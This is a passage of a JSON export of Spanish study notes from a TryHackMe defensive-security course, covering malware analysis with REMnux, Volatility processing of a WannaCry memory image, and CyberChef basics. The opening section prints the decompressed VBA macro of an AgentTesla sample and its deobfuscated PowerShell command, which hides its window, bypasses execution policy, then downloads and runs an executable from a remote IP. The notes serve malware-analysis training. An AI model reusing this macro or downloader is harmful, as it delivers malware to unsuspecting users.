57  *h..l^*.l* *^-*W\n00000130: 00 2A 69 2A 6E 2A 5E 64  2A 00 6F 2A 77 5E 2A 53  .*i*n*^d*.o*w^*S\n00000140: 2A 74 A0 2A 79 2A 5E 6C  00 11 20 00 14 02 69 01  *t.*y*^l.. ...i.\n00000150: 0C 64 2A 5E 65 2A 6E 2A  5E 00 08 2D 00 0B 78 41  .d*^e*n*^..-..xA\n00000160: 03 63 2A 12 75 00 0A 5E  69 00 0D 6E 2A 70 40 6F  .c*.u..^i..n*p@o\n00000170: 6C 5E 69 63 79 C0 07 62  00 2A 79 70 5E 5E 61 73  l^icy..b.*yp^^as\n00000180: 73 20 2A 3B 2A 20 24 01  4D 46 69 0A 6C 41 12 3D  s *;* $.MFi.lA.=\n00000190: C0 00 5B 2A 49 2A 80 4F  2A 2E 2A 50 2A 61 C0 0E  ..[*I*.O*.*P*a..\n000001A0: 00 68 2A 5D 2A 3A 3A 47  65 1A 74 40 09 2A 83 09  .h*]*::Ge.t@.*..\n000001B0: 41 79 28 29 20 40 7C 20  52 65 6E 5E C0 02 2D 00  Ay() @| Ren^..-.\n000001C0: 49 74 5E 65 6D 20 2D 4E  04 65 77 42 9A 7B 20 24  It^em -N.ewB.{ $\n000001D0: 5F 20 18 2D 72 65 40 62  40 82 27 74 6D 00 70 24  _ .-re@b@.'tm.p$\n000001E0: 27 2C 20 27 65 78 80 65  27 20 7D 20 96 50 C1 1D  ', 'ex.e' } .P..\n000001F0: 00 54 68 72 75 3B 20 49  6E 00 5E 76 6F 2A 6B 65  .Thru; In.^vo*ke\n00000200: 2D 57 00 65 5E 62 52 65  2A 71 75 00 65 73 74 20  -W.e^bRe*qu.est \n00000210: 2D 55 5E 72 00 69 20 22  22 68 74 74 70 00 3A 2F  -U^r.i \"\"http.:/\n00000220: 2F 31 39 33 2E 32 02 30  C3 00 36 37 2F 72 74 2F  /193.2.0..67/rt/\n00000230: 00 44 6F 63 2D 33 37 33  37 80 31 32 32 70 64 66  .Doc-3737.122pdf\n00000240: 2E 00 16 D0 22 22 20 2D  00 63 2A C1 27 07 34 02  ....\"\" -.c*.'.4.\n00000250: 3B 80 65 2A 61 72 74 2D  50 80 72 6F 63 65 2A 73  ;.e*art-P.roce*s\n00000260: 73 88 06 2B 00 B0 46 5E  52 83 2A 28 03 04 2C 20  s..+..F^R.*(.., \n00000270: 68 22 2A 22 00 01 22 C0  7D 97 08 5E 49 86 08 65  h\"*\"..\".}..^I..e\n00000280: 74 48 7C 3D 20 C2 B8 65  01 43 77 28 22 57 53 63  tH|= ..e.Cw(\"WSc\n00000290: 72 69 00 70 74 2E 53 68  65 6C 6C EB 8E 0B C2 82  ri.pt.Shell.....\n000002A0: 3D C7 03 2E 01 04 C4 18  C0 0A 08 45 6E 64 81 A3  =..........End..\n```\n\nLos resultados arriba son el dumpeo en formato hexadecimal. Hay una manera m√°s sencilla de leerlo, para ello debemos usar el par√°metro `--vbadecompress` adem√°s del comando anterior:\n\n```shell\nubuntu@MACHINE_IP:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm -s 4 --vbadecompress\n\nAttribute VB_Name = \"ThisWorkbook\"\nAttribute VB_Base = \"0{00020819-0000-0000-C000-000000000046}\"\nAttribute VB_GlobalNameSpace = False\nAttribute VB_Creatable = False\nAttribute VB_PredeclaredId = True\nAttribute VB_Exposed = False\nAttribute VB_TemplateDerived = False\nAttribute VB_Customizable = True\nPrivate Sub Workbook_Open()\nDim Sqtnew As String, sOutput As String\nDim Mggcbnuad As Object, MggcbnuadExec As Object\nSqtnew = \"^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' }  Pass*Thru; In^vo*ke-We^bRe*quest -U^ri \"\"http://193.203.203.67/rt/Doc-3737122pdf.exe\"\" -Out*File $TempFile; St*art-Proce*ss $TempFile;\"\nSqtnew = Replace(Sqtnew, \"*\", \"\")\nSqtnew = Replace(Sqtnew, \"^\", \"\")\nSet Mggcbnuad = CreateObject(\"WScript.Shell\")\nSet MggcbnuadExec = Mggcbnuad.Exec(Sqtnew)\n```\n\n¬øAs√≠ mucho mejor no? Nuestro mayor inter√©s est√° en el valor **Sqtnew**:\n\n```shell\nSqtnew = \"^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' }  Pass*Thru; In^vo*ke-We^bRe*quest -U^ri \"\"http://193.203.203.67/rt/Doc-3737122pdf.exe\"\" -Out*File $TempFile; St*art-Proce*ss $TempFile;\"\nSqtnew = Replace(Sqtnew, \"*\", \"\")\nSqtnew = Replace(Sqtnew, \"^\", \"\")\n```\n\nCopiaremos la primera parte en CyberChef y seleccionas **Find/Replace** dos veces metiendo cada una de las instrucciones. En nuestro caso la primera es cambiar \"* \" por \"\" y el segundo \"^\" por \"\".\n\n![[Pasted image 20251029175423.png]]\n\nVeamos el output:\n\n```shell\npowershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' }  PassThru; Invoke-WebRequest -Uri \"http://193.203.203.67/rt/Doc-3737122pdf.exe\" -OutFile $TempFile; Start-Process $TempFile;\"\n```\n\n- Correr `-WindowStyle` en PowerShell te permite controlar c√≥mo la ventana de PowerShell aparece al ejecutar un script o comando. En este caso `hidden` (escondido) significa que no ser√° visible para el usuario.\n- Por defecto, PowerShell restringe la ejecuci√≥n de scripts. El par√°metro `-executionPolicy` permite sobreseguir esta pol√≠tica. El `bypass` significa que la restricci√≥n se ignora temporalmente.\n- El `Invoke-WebRequest` se usa com√∫nmente para descargar archivos de internet.\n\t- El par√°metro `-Uri` nos deja especificar la URL del recurso web a descargar.\n\t- El par√°metro `-OutFile` especifica el archivo local donde el contenido descargado se guardar√°.\n- El `Start-Process` es ussado para ejecutar el archivo descargado guardado en `$TempFile`.\n\nPara resumirlo, cuando el documento `agenttesla.xlsm` se abre, se dispara una Macro. Esta macro contiene un script VBA. El script se ejecutar√° sustituyendo los caracteres necesarios en el payload y despu√©s lo ejecutar√°. Este payload ejecuta powershell sin que el usuario pueda ver la interfaz y descarga un archivo de internet y lo ejecuta.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Memory Investigation - Evidence Processing",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/3-remnux-getting-started/4-memory-investigation-evidence-processing/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/3. REMnux - Getting Started/4. Memory Investigation - Evidence Processing.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 3. REMnux - Getting Started",
    "content": "Una de las pr√°cticas investigativas m√°s comunes en la for√©nsica digital es el pre-procesado de evidencia. Esto incluye ejecutar herramientas y guardar los resultados en texto o JSON. El analista normalmente conf√≠a en herramientas como Volatility al lidiar con im√°genes de memoria como evidencia. Esta herramienta ya est√° incluida en REMnux. Los comandos de volatility se ejecutan para identificar y extraer artefactos espec√≠ficos de las im√°genes de memoria.\n\n----------------------------\n<h2>Pre-procesado con Volatility</h2>\nEn esta tarea usaremos la versi√≥n de la herramienta Volatility 3. Sin embargo, no iremos muy profundo en la parte de an√°lisis de resultados. Queremos que te familiarices un poco con la herramienta. Ejecuta el comando como se dice y espera el resultado. Cada plugin toma entre 2-3 minutos para mostrar el output.\n\nAqu√≠ hay algunos de los par√°metros o plugins que usaremos. Nos enfocaremos en plugins de Windows.\n\nEn la m√°quina REMnux, `sudo su` y luego navega hasta `/home/ubuntu/Desktop/tasks/Wcry_memory_image/` y nuestro archivo ser√° **wcry.mem**. Correremos cada plugin despu√©s del comando `vol3 -f wcry.mem`.\n\n----------------------------\n<h2>PsTree</h2>\nEste plugin procesa en un √°rbol basado en los procesos padres:\n\n```powershell\nroot@10.10.134.94:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.pstree.PsTree\nVolatility 3 Framework 2.0.0\nProgress:  100.00\t\tPDB scanning finished\n\nPID\tPPID\tImageFileName\tOffset(V)\tThreads\tHandles\tSessionId\tWow64\tCreateTime\tExitTime\n\n4\t0\tSystem\t0x823c8830\t51\t244\tN/A\tFalse\tN/A\tN/A\n* 348\t4\tsmss.exe\t0x82169020\t3\t19\tN/A\tFalse\t2017-05-12 21:21:55.000000 \tN/A\n** 620\t348\twinlogon.exe\t0x8216e020\t23\t536\t0\tFalse\t2017-05-12 21:22:01.000000 \tN/A\n*** 664\t620\tservices.exe\t0x821937f0\t15\t265\t0\tFalse\t2017-05-12 21:22:01.000000 \tN/A\n**** 1024\t664\tsvchost.exe\t0x821af7e8\t79\t1366\t0\tFalse\t2017-05-12 21:22:03.000000 \tN/A\n***** 1768\t1024\twuauclt.exe\t0x81f747c0\t7\t132\t0\tFalse\t2017-05-12 21:22:52.000000 \tN/A\n***** 1168\t1024\twscntfy.exe\t0x81fea8a0\t1\t37\t0\tFalse\t2017-05-12 21:22:56.000000 \tN/A\n**** 1152\t664\tsvchost.exe\t0x821bea78\t10\t173\t0\tFalse\t2017-05-12 21:22:06.000000 \tN/A\n**** 544\t664\talg.exe\t0x82010020\t6\t101\t0\tFalse\t2017-05-12 21:22:55.000000 \tN/A\n**** 836\t664\tsvchost.exe\t0x8221a2c0\t19\t211\t0\tFalse\t2017-05-12 21:22:02.000000 \tN/A\n**** 260\t664\tsvchost.exe\t0x81fb95d8\t5\t105\t0\tFalse\t2017-05-12 21:22:18.000000 \tN/A\n**** 904\t664\tsvchost.exe\t0x821b5230\t9\t227\t0\tFalse\t2017-05-12 21:22:03.000000 \tN/A\n**** 1484\t664\tspoolsv.exe\t0x821e2da0\t14\t124\t0\tFalse\t2017-05-12 21:22:09.000000 \tN/A\n**** 1084\t664\tsvchost.exe\t0x8203b7a8\t6\t72\t0\tFalse\t2017-05-12 21:22:03.000000 \tN/A\n*** 676\t620\tlsass.exe\t0x82191658\t23\t353\t0\tFalse\t2017-05-12 21:22:01.000000 \tN/A\n** 596\t348\tcsrss.exe\t0x82161da0\t12\t352\t0\tFalse\t2017-05-12 21:22:00.000000 \tN/A\n1636\t1608\texplorer.exe\t0x821d9da0\t11\t331\t0\tFalse\t2017-05-12 21:22:10.000000 \tN/A\n* 1956\t1636\tctfmon.exe\t0x82231da0\t1\t86\t0\tFalse\t2017-05-12 21:22:14.000000 \tN/A\n* 1940\t1636\ttasksche.exe\t0x82218da0\t7\t51\t0\tFalse\t2017-05-12 21:22:14.000000 \tN/A\n** 740\t1940\t@WanaDecryptor@\t0x81fde308\t2\t70\t0\tFalse\t2017-05-12 21:22:22.000000 \tN/A\n```\n\n----------------------------\n<h2>PsList</h2>\nEste plugin se usa para listar todos los procesos actualmente activos en la m√°quina.\n\n```powershell\nroot@10.10.134.94:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.pslist.PsList\nVolatility 3 Framework 2.0.0\nProgress:  100.00\t\tPDB scanning finished\n\nPID\tPPID\tImageFileName\tOffset(V)\tThreads\tHandles\tSessionId\tWow64\tCreateTime\tExitTime\tFile output\n\n4\t0\tSystem\t0x823c8830\t51\t244\tN/A\tFalse\tN/A\tN/A\tDisabled\n348\t4\tsmss.exe\t0x82169020\t3\t19\tN/A\tFalse\t2017-05-12 21:21:55.000000 \tN/A\tDisabled\n596\t348\tcsrss.exe\t0x82161da0\t12\t352\t0\tFalse\t2017-05-12 21:22:00.000000 \tN/A\tDisabled\n620\t348\twinlogon.exe\t0x8216e020\t23\t536\t0\tFalse\t2017-05-12 21:22:01.000000 \tN/A\tDisabled\n664\t620\tservices.exe\t0x821937f0\t15\t265\t0\tFalse\t2017-05-12 21:22:01.000000 \tN/A\tDisabled\n676\t620\tlsass.exe\t0x82191658\t23\t353\t0\tFalse\t2017-05-12 21:22:01.000000 \tN/A\tDisabled\n836\t664\tsvchost.exe\t0x8221a2c0\t19\t211\t0\tFalse\t2017-05-12 21:22:02.000000 \tN/A\tDisabled\n904\t664\tsvchost.exe\t0x821b5230\t9\t227\t0\tFalse\t2017-05-12 21:22:03.000000 \tN/A\tDisabled\n1024\t664\tsvchost.exe\t0x821af7e8\t79\t1366\t0\tFalse\t2017-05-12 21:22:03.000000 \tN/A\tDisabled\n1084\t664\tsvchost.exe\t0x8203b7a8\t6\t72\t0\tFalse\t2017-05-12 21:22:03.000000 \tN/A\tDisabled\n1152\t664\tsvchost.exe\t0x821bea78\t10\t173\t0\tFalse\t2017-05-12 21:22:06.000000 \tN/A\tDisabled\n1484\t664\tspoolsv.exe\t0x821e2da0\t14\t124\t0\tFalse\t2017-05-12 21:22:09.000000 \tN/A\tDisabled\n1636\t1608\texplorer.exe\t0x821d9da0\t11\t331\t0\tFalse\t2017-05-12 21:22:10.000000 \tN/A\tDisabled\n1940\t1636\ttasksche.exe\t0x82218da0\t7\t51\t0\tFalse\t2017-05-12 21:22:14.000000 \tN/A\tDisabled\n1956\t1636\tctfmon.exe\t0x82231da0\t1\t86\t0\tFalse\t2017-05-12 21:22:14.000000 \tN/A\tDisabled\n260\t664\tsvchost.exe\t0x81fb95d8\t5\t105\t0\tFalse\t2017-05-12 21:22:18.000000 \tN/A\tDisabled\n740\t1940\t@WanaDecryptor@\t0x81fde308\t2\t70\t0\tFalse\t2017-05-12 21:22:22.000000 \tN/A\tDisabled\n1768\t1024\twuauclt.exe\t0x81f747c0\t7\t132\t0\tFalse\t2017-05-12 21:22:52.000000 \tN/A\tDisabled\n544\t664\talg.exe\t0x82010020\t6\t101\t0\tFalse\t2017-05-12 21:22:55.000000 \tN/A\tDisabled\n1168\t1024\twscntfy.exe\t0x81fea8a0\t1\t37\t0\tFalse\t2017-05-12 21:22:56.000000 \tN/A\tDisabled\n```\n\n---------------------------\n<h2>CmdLine</h2>\nEste plugin se usa para listar argumentos de procesos de linea de comandos.\n\n```powershell\nroot@10.10.134.94:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.cmdline.CmdLine\nVolatility 3 Framework 2.0.0\nProgress:  100.00\t\tPDB scanning finished\n\nPID\tProcess\tArgs\n\n4\tSystem\tRequired memory at 0x10 is not valid (process exited?)\n348\tsmss.exe\t\\SystemRoot\\System32\\smss.exe\n596\tcsrss.exe\tC:\\WINDOWS\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,3072,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ProfileControl=Off MaxRequestThreads=16\n620\twinlogon.exe\twinlogon.exe\n664\tservices.exe\tC:\\WINDOWS\\system32\\services.exe\n676\tlsass.exe\tC:\\WINDOWS\\system32\\lsass.exe\n836\tsvchost.exe\tC:\\WINDOWS\\system32\\svchost -k DcomLaunch\n904\tsvchost.exe\tC:\\WINDOWS\\system32\\svchost -k rpcss\n1024\tsvchost.exe\tC:\\WINDOWS\\System32\\svchost.exe -k netsvcs\n1084\tsvchost.exe\tC:\\WINDOWS\\system32\\svchost.exe -k NetworkService\n1152\tsvchost.exe\tC:\\WINDOWS\\system32\\svchost.exe -k LocalService\n1484\tspoolsv.exe\tC:\\WINDOWS\\system32\\spoolsv.exe\n1636\texplorer.exe\tC:\\WINDOWS\\Explorer.EXE\n1940\ttasksche.exe\t\"C:\\Intel\\ivecuqmanpnirkt615\\tasksche.exe\" \n1956\tctfmon.exe\t\"C:\\WINDOWS\\system32\\ctfmon.exe\" \n260\tsvchost.exe\tC:\\WINDOWS\\system32\\svchost.exe -k LocalService\n740\t@WanaDecryptor@\t@WanaDecryptor@.exe\n1768\twuauclt.exe\t\"C:\\WINDOWS\\system32\\wuauclt.exe\" /RunStoreAsComServer Local\\[400]SUSDS81a6658cb72fa845814e75cca9a42bf2\n544\talg.exe\tC:\\WINDOWS\\System32\\alg.exe\n1168\twscntfy.exe\tC:\\WINDOWS\\system32\\wscntfy.exe\n```\n\n------------------------------------\n<h2>FileScan</h2>\nEste plugin escanea objetos en una imagen de memoria particular. Los resultados tienen m√°s de 1400 l√≠neas, pongo s√≥lo un ejemplo del output.\n\n```powershell\nroot@10.10.134.94:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.filescan.FileScan\nVolatility 3 Framework 2.0.0\nProgress:  100.00\t\tPDB scanning finished\n\nOffset\tName\tSize\n0x1f40310\t\\Endpoint\t112\n0x1f65718\t\\Endpoint\t112\n0x1f66cd8\t\\WINDOWS\\system32\\wbem\\wmipcima.dll\t112\n0x1f67198\t\\WINDOWS\\Prefetch\\TASKDL.EXE-01687054.pf\t112\n0x1f67a70\t\\WINDOWS\\system32\\security.dll\t112\n0x1f67c68\t\\boot.ini\t112\n0x1f67ef8\t\\WINDOWS\\system32\\cfgmgr32.dll\t112\n0x1f684d0\t\\WINDOWS\\system32\\wbem\\framedyn.dll\t112\n0x1f686d8\t\\WINDOWS\\system32\\wbem\\cimwin32.dll\t112\n0x1f6a7f0\t\\WINDOWS\\system32\\kmddsp.tsp\t112\n0x1f6ae20\t\\$Directory\t112\n0x1f6b9b0\t\\$Directory\t112\n0x1f6bbf8\t\\$Directory\t112\n```\n\n---------------------------\n<h2>DllList</h2>\nEste plugin lista los m√≥dulos cargados en una imagen de memoria particular de Windows. Debido a limitaci√≥n de texto, no podemos ver el resultado aqu√≠.\n\n```powershell\noot@10.10.134.94:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.dlllist.DllList\nVolatility 3 Framework 2.0.0\nProgress:  100.00\t\tPDB scanning finished\n```\n\n-------------------------------------\n<h2>PsScan</h2>\nEste plugin se usa para escanear procesos presentes en imagenes de memorias Windows particulares.\n\n```powershell\nroot@10.10.134.94:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.psscan.PsScan\nVolatility 3 Framework 2.0.0\nProgress:  100.00\t\tPDB scanning finished\n\nPID\tPPID\tImageFileName\tOffset(V)\tThreads\tHandles\tSessionId\tWow64\tCreateTime\tExitTime\tFile output\n860\t1940\ttaskdl.exe\t0x1f4daf0\t0\t-\t0\tFalse\t2017-05-12 21:26:23.000000 \t2017-05-12 21:26:23.000000 \tDisabled\n536\t1940\ttaskse.exe\t0x1f53d18\t0\t-\t0\tFalse\t2017-05-12 21:26:22.000000 \t2017-05-12 21:26:23.000000 \tDisabled\n424\t1940\t@WanaDecryptor@\t0x1f69b50\t0\t-\t0\tFalse\t2017-05-12 21:25:52.000000 \t2017-05-12 21:25:53.000000 \tDisabled\n1768\t1024\twuauclt.exe\t0x1f747c0\t7\t132\t0\tFalse\t2017-05-12 21:22:52.000000 \tN/A\tDisabled\n576\t1940\t@WanaDecryptor@\t0x1f8ba58\t0\t-\t0\tFalse\t2017-05-12 21:26:22.000000 \t2017-05-12 21:26:23.000000 \tDisabled\n260\t664\tsvchost.exe\t0x1fb95d8\t5\t105\t0\tFalse\t2017-05-12 21:22:18.000000 \tN/A\tDisabled\n740\t1940\t@WanaDecryptor@\t0x1fde308\t2\t70\t0\tFalse\t2017-05-12 21:22:22.000000 \tN/A\tDisabled\n1168\t1024\twscntfy.exe\t0x1fea8a0\t1\t37\t0\tFalse\t2017-05-12 21:22:56.000000 \tN/A\tDisabled\n544\t664\talg.exe\t0x2010020\t6\t101\t0\tFalse\t2017-05-12 21:22:55.000000 \tN/A\tDisabled\n1084\t664\tsvchost.exe\t0x203b7a8\t6\t72\t0\tFalse\t2017-05-12 21:22:03.000000 \tN/A\tDisabled\n596\t348\tcsrss.exe\t0x2161da0\t12\t352\t0\tFalse\t2017-05-12 21:22:00.000000 \tN/A\tDisabled\n348\t4\tsmss.exe\t0x2169020\t3\t19\tN/A\tFalse\t2017-05-12 21:21:55.000000 \tN/A\tDisabled\n620\t348\twinlogon.exe\t0x216e020\t23\t536\t0\tFalse\t2017-05-12 21:22:01.000000 \tN/A\tDisabled\n676\t620\tlsass.exe\t0x2191658\t23\t353\t0\tFalse\t2017-05-12 21:22:01.000000 \tN/A\tDisabled\n664\t620\tservices.exe\t0x21937f0\t15\t265\t0\tFalse\t2017-05-12 21:22:01.000000 \tN/A\tDisabled\n1024\t664\tsvchost.exe\t0x21af7e8\t79\t1366\t0\tFalse\t2017-05-12 21:22:03.000000 \tN/A\tDisabled\n904\t664\tsvchost.exe\t0x21b5230\t9\t227\t0\tFalse\t2017-05-12 21:22:03.000000 \tN/A\tDisabled\n1152\t664\tsvchost.exe\t0x21bea78\t10\t173\t0\tFalse\t2017-05-12 21:22:06.000000 \tN/A\tDisabled\n1636\t1608\texplorer.exe\t0x21d9da0\t11\t331\t0\tFalse\t2017-05-12 21:22:10.000000 \tN/A\tDisabled\n1484\t664\tspoolsv.exe\t0x21e2da0\t14\t124\t0\tFalse\t2017-05-12 21:22:09.000000 \tN/A\tDisabled\n1940\t1636\ttasksche.exe\t0x2218da0\t7\t51\t0\tFalse\t2017-05-12 21:22:14.000000 \tN/A\tDisabled\n836\t664\tsvchost.exe\t0x221a2c0\t19\t211\t0\tFalse\t2017-05-12 21:22:02.000000 \tN/A\tDisabled\n1956\t1636\tctfmon.exe\t0x2231da0\t1\t86\t0\tFalse\t2017-05-12 21:22:14.000000 \tN/A\tDisabled\n4\t0\tSystem\t0x23c8830\t51\t244\tN/A\tFalse\tN/A\tN/A\tDisabled\n```\n\n-------------------------------------\n<h2>Malfind</h2>\nEste plugin se usa para listar rangos de procesos de memoria que potencialmente tienen c√≥digo inyectado. No habr√° resultados por limitaciones de texto.\n\n```powershell\nroot@10.10.134.94:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ vol3 -f wcry.mem windows.malfind.Malfind\nVolatility 3 Framework 2.0.0\nProgress:  100.00\t\tPDB scanning finished\n```\n\nPara m√°s informaci√≥n respecto a plugins consulta este [link](https://volatility3.readthedocs.io/en/stable/volatility3.plugins.html).\n\nPero ahora los tienes uno por uno, ¬øc√≥mo procesamos esto en bloque? La respuesta es haciendo un bucle y metiendo los logs en archivos:\n\n```powershell\nroot@10.10.134.94:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt; done\n```\n\nVeamos el comando:\n\n- Creamos una variable `$plugin` con los valores de cada plugin.\n- Entonces el comando `vol3` corre el par√°metro `-q`, que significa modo silencioso.\n- El par√°metro `-f` hace que lea de la captura de memoria.\n- La parte `plugin > wcry.$plugin.txt; done;` hace que volatility corra con los plugins y meta el resultado en un archivo con el nombre del plugin.\nDespu√©s de ejecutar el comando nos encontraremos con esto:\n\n![[Pasted image 20251029200952.png]]\n\n-------------------------------\n<h2>Pre-procesado con Strings</h2>\nDespu√©s, pre-procesaremos la imagen de memoria con las utilidades de strings de Linux. Extraeremos las cadenas: ASCII, 16-bit little-endian, y 16-bit big-endian. Con los siguientes comandos:\n\n```powershell\nroot@10.10.134.94:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ strings wcry.mem > wcry.strings.ascii.txt\nroot@10.10.134.94:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ strings -e l  wcry.mem > wcry.strings.unicode_little_endian.txt\nroot@10.10.134.94:/home/ubuntu/Desktop/tasks/Wcry_memory_image$ strings -e b  wcry.mem > wcry.strings.unicode_big_endian.txt\n```\n\nLos comandos strings extraen texto ASCII legible. La opci√≥n `-e l` le dice a la string que extraiga 16-bit little endian. Mientras que la opci√≥n `-e b` le dice que extraiga las strings 16-bit  big endian.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. REMnux - Getting Started",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/3-remnux-getting-started/0-remnux-getting-started/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/3. REMnux - Getting Started/0. REMnux - Getting Started.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 3. REMnux - Getting Started",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/3. REMnux - Getting Started/1. Introduction]]\n[[2. File Analysis]]\n[[3. Fake Network to Aid Analysis]]\n[[4. Memory Investigation - Evidence Processing]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/1-cyberchef-the-basics/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/1. CyberChef - The Basics/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 1. CyberChef - The Basics",
    "content": "CyberChef es una aplicaci√≥n simple, intuitiva y basada en web dise√±ada para ayudar con varias operaciones en tu navegador. Piensa en una navaja suiza para la informaci√≥n, como tener una caja de herramientas con diferentes herramientas dise√±adas para tareas espec√≠ficas. Estas tareas fluct√∫an desde encodings simples, como XOR o Base64 hasta operaciones complejas como encriptaci√≥n AES o desencriptaci√≥n RSA. CyberChef opera con recetas, una serie de instrucciones ejecutadas en orden.\n\n----------------------\n<h2>Objetivos de Aprendizaje</h2>\n- Aprender lo que es CyberChef\n- Aprender a c√≥mo navegar su interfaz\n- Entender operaciones comunes\n- Aprender c√≥mo crear recetas y procesar informaci√≥n\n\n-----------------------------\n<h2>Pre-requisitos</h2>\n- [[0. Hashing Basics]]\n- [[0. Cryptography Basics]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Your First Official Cook",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/1-cyberchef-the-basics/6-your-first-official-cook/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/1. CyberChef - The Basics/6. Your First Official Cook.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 1. CyberChef - The Basics",
    "content": "Esta tarea nos permite aplicar lo que hemos aprendido en tareas anteriores. Utilizaremos CyberChef para responder a las preguntas.\n\n- Using the file you downloaded in Task 5, which IP starts and ends with \"10\"?\n  ![[Pasted image 20251026150818.png]]\n- What is the base64 encoded value of the string \"**Nice Room!**\"?\n  ![[Pasted image 20251026150930.png]]\n- What is the URL decoded value for¬†`https%3A%2F%2Ftryhackme%2Ecom%2Fr%2Froom%2Fcyberchefbasics`?\n  ![[Pasted image 20251026151008.png]]\n- What is the datetime string for the Unix timestamp `1725151258`?\n  ![[Pasted image 20251026151348.png]]\n- What is the Base85 decoded string of the value¬†`<+oue+DGm>Ap%u7`?\n  ![[Pasted image 20251026151436.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Accessing the Tool",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/1-cyberchef-the-basics/2-accessing-the-tool/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/1. CyberChef - The Basics/2. Accessing the Tool.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 1. CyberChef - The Basics",
    "content": "Hay varias maneras de acceder a CyberChef. Veamos las dos m√°s convenientes.\n\n-------------------------------\n<h2>Acceso Online</h2>\nTodo lo que necesitas es buscar en el navegador CyberChef o hacer click en este [link](https://gchq.github.io/CyberChef/).\n\n-------------------------------\n<h2>Copia Offline o Local</h2>\nPuedes correr la copia local descargando la √∫ltima versi√≥n en este [link](https://github.com/gchq/CyberChef/releases). Esto funciona en Windows y Linux. Como buena praxis, deber√≠as descargarte la versi√≥n m√°s estable.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Navigating the Interface",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/1-cyberchef-the-basics/3-navigating-the-interface/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/1. CyberChef - The Basics/3. Navigating the Interface.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 1. CyberChef - The Basics",
    "content": "CyberChef consiste de 4 √°reas. Cada una de estas tiene diferentes componentes o funcionalidades. Las cuatro √°reas son:\n\n1. Operaciones\n2. Receta\n3. Input\n4. Output\n\n![[Pasted image 20251026130851.png]]\n\nVeamos lo que hace cada una de ellas.\n\n---------------------------------\n<h2>Operaciones</h2>\nRepositorio pr√°ctico de todas las operaciones que CyberChef est√° equipado para hacer. Estas operaciones se categorizan meticulosamente, ofreciendo a los usuarios acceso a varias capabilidades.\n\nAqu√≠ unas de las operaciones que ver√°s durante tu trayectoria:\n\n| Operaciones     | Descripci√≥n                                                  | Ejemplos                                                                                                                                                                                 |\n| --------------- | -------------------------------------- | ---------------------------------------------|\n| From Morse Code | Traduce c√≥digo morse a caracteres alfanum√©ricos 